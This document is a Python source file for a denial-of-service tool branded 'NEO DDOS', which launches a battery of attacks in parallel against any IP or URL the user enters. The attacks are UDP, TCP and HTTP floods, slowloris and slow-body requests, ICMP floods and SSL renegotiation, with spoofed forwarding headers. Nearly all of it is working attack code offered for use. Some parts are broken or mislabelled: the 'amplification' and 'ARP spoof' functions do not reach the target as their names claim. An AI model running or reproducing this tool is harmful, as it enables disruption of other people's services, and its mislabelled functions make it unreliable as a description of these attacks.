import os
import sys
import socket
import threading
import random
import time
import requests
import argparse
import subprocess
import json
import string
import ssl
import hashlib
import base64
from urllib.parse import urlparse
from fake_useragent import UserAgent

DEFAULT_DURATION = 10
DEFAULT_THREADS = 100

stats = {
    "udp": 0, "tcp_syn": 0, "http_get": 0, "http_post": 0,
    "slowloris": 0, "icmp": 0, "dns": 0, "ntp": 0, "memcached": 0,
    "ssl_reneg": 0, "http_slow": 0, "ping_death": 0, "arp": 0, "errors": 0, "start_time": None
}

def random_ip():
    return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

def random_string(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def udp_flood(ip, port, duration, threads):
    def worker():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        end = time.time() + duration
        while time.time() < end:
            try:
                sock.sendto(random._urandom(65500), (ip, port))
                stats["udp"] += 1
            except:
                stats["errors"] += 1
        sock.close()
    for _ in range(threads):
        threading.Thread(target=worker, daemon=True).start()

def tcp_syn_flood(ip, port, duration, threads):
    def worker():
        end = time.time() + duration
        while time.time() < end:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                sock.connect_ex((ip, port))
                stats["tcp_syn"] += 1
                sock.close()
            except:
                stats["errors"] += 1
    for _ in range(threads):
        threading.Thread(target=worker, daemon=True).start()

def http_get_flood(url, duration, threads):
    def worker():
        ua = UserAgent()
        session = requests.Session()
        end = time.time() + duration
        while time.time() < end:
            try:
                headers = {"User-Agent": ua.random, "X-Forwarded-For": random_ip(), "Accept-Encoding": "gzip, deflate, br"}
                session.get(url + "?" + random_string(20) + "=" + random_string(20), headers=headers, timeout=3, verify=False)
                stats["http_get"] += 1
            except:
                stats["errors"] += 1
        session.close()
    for _ in range(threads):
        threading.Thread(target=worker, daemon=True).start()

def http_post_flood(url, duration, threads):
    def worker():
        ua = UserAgent()
        session = requests.Session()
        end = time.time() + duration
        while time.time() < end:
            try:
                payload = {random_string(10): random_string(5000)}
                headers = {"User-Agent": ua.random, "X-Forwarded-For": random_ip(), "Content-Type": "application/x-www-form-urlencoded"}
                session.post(url, data=payload, headers=headers, timeout=3, verify=False)
                stats["http_post"] += 1
            except:
                stats["errors"] += 1
        session.close()
    for _ in range(threads):
        threading.Thread(target=worker, daemon=True).start()

def slowloris(ip, port, duration, threads):
    sockets = []
    def worker():
        nonlocal sockets
        end = time.time() + duration
        while time.time() < end and len(sockets) < 10000:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((ip, port))
                sock.send(f"GET /{random_string(15)} HTTP/1.1\r\nHost: {ip}\r\n".encode())
                sock.send(b"User-Agent: Mozilla/5.0\r\n")
                sock.send(b"Content-Length: 1000000\r\nConnection: keep-alive\r\n\r\n")
                sockets.append(sock)
                stats["slowloris"] += 1
            except:
                stats["errors"] += 1
        while time.time() < end:
            time.sleep(4)
            for s in sockets[:]:
                try:
                    s.send(f"X-Keep-Alive: {random_string(10)}\r\n".encode())
                except:
                    sockets.remove(s)
    for _ in range(threads):
        threading.Thread(target=worker, daemon=True).start()

def icmp_flood(ip, duration, threads):
    def worker():
        end = time.time() + duration
        while time.time() < end:
            try:
                subprocess.run(["ping", "-n", "1", "-l", "65500", ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
                stats["icmp"] += 1
            except:
                stats["errors"] += 1
    for _ in range(threads):
        threading.Thread(target=worker, daemon=True).start()

def dns_amplification(ip, duration, threads):
    def worker():
        end = time.time() + duration
        domains = ["google.com", "facebook.com", "amazon.com", "microsoft.com", "cloudflare.com"]
        dns_servers = ["8.8.8.8", "1.1.1.1", "9.9.9.9", "208.67.222.222", "8.26.56.26"]
        while time.time() < end:
            try:
                import dns.resolver
                resolver = dns.resolver.Resolver()
                resolver.nameservers = [random.choice(dns_servers)]
                resolver.resolve(random.choice(domains), "ANY")
                stats["dns"] += 1
            except:
                stats["errors"] += 1
    for _ in range(threads):
        threading.Thread(target=worker, daemon=True).start()

def ntp_amplification(ip, duration, threads):
    def worker():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        ntp_query = b'\x17\x00\x03\x2a' + b'\x00' * 4
        end = time.time() + duration
        ntp_servers = ["time.google.com", "pool.ntp.org", "time.windows.com", "0.pool.ntp.org"]
        while time.time() < end:
            try:
                target = random.choice(ntp_servers)
                addr = socket.gethostbyname(target)
                sock.sendto(ntp_query, (addr, 123))
                stats["ntp"] += 1
            except:
                stats["errors"] += 1
        sock.close()
    for _ in range(threads):
        threading.Thread(target=worker, daemon=True).start()

def memcached_amplification(ip, duration, threads):
    def worker():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        memcached_query = b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
        end = time.time() + duration
        memcached_servers = ["127.0.0.1"]
        while time.time() < end:
            try:
                target = random.choice(memcached_servers)
                sock.sendto(memcached_query, (target, 11211))
                stats["memcached"] += 1
            except:
                stats["errors"] += 1
        sock.close()
    for _ in range(threads):
        threading.Thread(target=worker, daemon=True).start()

def ssl_renegotiation(ip, port, duration, threads):
    def worker():
        end = time.time() + duration
        while time.time() < end:
            try:
                context = ssl.create_default_context()
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                ssl_sock = context.wrap_socket(sock, server_hostname=ip)
                ssl_sock.connect((ip, port))
                for _ in range(100):
                    ssl_sock.send(b"GET / HTTP/1.1\r\n\r\n")
                stats["ssl_reneg"] += 1
                ssl_sock.close()
            except:
                stats["errors"] += 1
    for _ in range(threads):
        threading.Thread(target=worker, daemon=True).start()

def http_slow_body(ip, port, duration, threads):
    def worker():
        end = time.time() + duration
        while time.time() < end:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((ip, port))
                sock.send(f"POST / HTTP/1.1\r\nHost: {ip}\r\nContent-Length: 1000000\r\n\r\n".encode())
                for _ in range(500):
                    sock.send(b"a")
                    time.sleep(0.1)
                stats["http_slow"] += 1
                sock.close()
            except:
                stats["errors"] += 1
    for _ in range(threads):
        threading.Thread(target=worker, daemon=True).start()

def ping_of_death(ip, duration, threads):
    def worker():
        end = time.time() + duration
        while time.time() < end:
            try:
                subprocess.run(["ping", "-n", "1", "-l", "65535", ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
                stats["ping_death"] += 1
            except:
                stats["errors"] += 1
    for _ in range(threads):
        threading.Thread(target=worker, daemon=True).start()

def arp_spoof(ip, duration, threads):
    def worker():
        end = time.time() + duration
        while time.time() < end:
            try:
                subprocess.run(["arp", "-s", ip, "ff:ff:ff:ff:ff:ff"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
                stats["arp"] += 1
            except:
                stats["errors"] += 1
    for _ in range(threads):
        threading.Thread(target=worker, daemon=True).start()

def all_attacks(ip, port, url, duration, threads):
    udp_flood(ip, port, duration, threads)
    tcp_syn_flood(ip, port, duration, threads)
    http_get_flood(url, duration, threads)
    http_post_flood(url, duration, threads)
    slowloris(ip, port, duration, max(1, threads//10))
    icmp_flood(ip, duration, threads)
    dns_amplification(ip, duration, max(1, threads//5))
    ntp_amplification(ip, duration, max(1, threads//5))
    memcached_amplification(ip, duration, max(1, threads//5))
    ssl_renegotiation(ip, port, duration, max(1, threads//10))
    http_slow_body(ip, port, duration, max(1, threads//10))
    ping_of_death(ip, duration, max(1, threads//10))
    arp_spoof(ip, duration, max(1, threads//20))

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("\033[91m" + r"""
    ███▄    █ ▓█████  ▒█████     ▓█████▄ ▓█████▄  ▒█████    ██████ 
    ██ ▀█   █ ▓█   ▀ ▒██▒  ██▒   ▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
    ▓██  ▀█ ██▒▒███   ▒██░  ██▒   ░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   
    ▓██▒  ▐▌██▒▒▓█  ▄ ▒██   ██░   ░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒
    ▒██░   ▓██░░▒████▒░ ████▓▒░   ░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒
    ░ ▒░   ▒ ▒ ░░ ▒░ ░░ ▒░▒░▒░     ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
    ░ ░░   ░ ▒░ ░ ░  ░  ░ ▒ ▒░     ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
       ░   ░ ░    ░   ░ ░ ░ ▒      ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
             ░    ░  ░    ░ ░        ░       ░        ░ ░        ░    by camzzz  https://github.com/cameleonnbss
                                   ░       ░                         
    """ + "\033[0m")
    print("\033[91m[!] NEW DESTRUCTION TOOL - ALL ATTACKS ACTIVE\033[0m")
    
    target_input = input("\033[93m[?] Enter IP or URL (ex: 192.168.1.1 or http://example.com): \033[0m").strip()
    if not target_input:
        print("\033[91m[!] Invalid target.\033[0m")
        input("\nPress Enter to exit...")
        return

    if target_input.startswith(("http://", "https://")):
        parsed = urlparse(target_input)
        ip = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        url = target_input
    else:
        ip = target_input
        port_input = input("\033[93m[?] Port (Enter=80): \033[0m").strip()
        port = int(port_input) if port_input else 80
        url = f"http://{ip}:{port}"

    try:
        duration = int(input("\033[93m[?] Duration (seconds, Enter=10): \033[0m").strip() or DEFAULT_DURATION)
        threads = int(input("\033[93m[?] Threads (Enter=100): \033[0m").strip() or DEFAULT_THREADS)
    except:
        duration = DEFAULT_DURATION
        threads = DEFAULT_THREADS

    print("\033[91m[!] Launching ALL attacks in parallel...\033[0m")
    stats["start_time"] = time.time()
    all_attacks(ip, port, url, duration, threads)

    start = time.time()
    while time.time() - start < duration:
        elapsed = time.time() - start
        sys.stdout.write(f"\r\033[92m[+] Time: {elapsed:.1f}s | UDP: {stats['udp']} | TCP: {stats['tcp_syn']} | HTTP GET: {stats['http_get']} | POST: {stats['http_post']} | Slowloris: {stats['slowloris']} | ICMP: {stats['icmp']} | DNS: {stats['dns']} | NTP: {stats['ntp']} | Memcached: {stats['memcached']} | SSL: {stats['ssl_reneg']} | SlowBody: {stats['http_slow']} | PoD: {stats['ping_death']} | ARP: {stats['arp']} | Errors: {stats['errors']}\033[0m   ")
        sys.stdout.flush()
        time.sleep(1)

    print("\n\n\033[91m[!] ATTACK FINISHED\033[0m")
    print(f"\033[93mUDP: {stats['udp']} | TCP SYN: {stats['tcp_syn']} | HTTP GET: {stats['http_get']} | HTTP POST: {stats['http_post']} | Slowloris: {stats['slowloris']} | ICMP: {stats['icmp']} | DNS: {stats['dns']} | NTP: {stats['ntp']} | Memcached: {stats['memcached']} | SSL Reneg: {stats['ssl_reneg']} | HTTP Slow: {stats['http_slow']} | Ping Death: {stats['ping_death']} | ARP: {stats['arp']} | Errors: {stats['errors']}\033[0m")
    input("\nPress Enter to exit...")

if __name__ == "__main__":
    main()
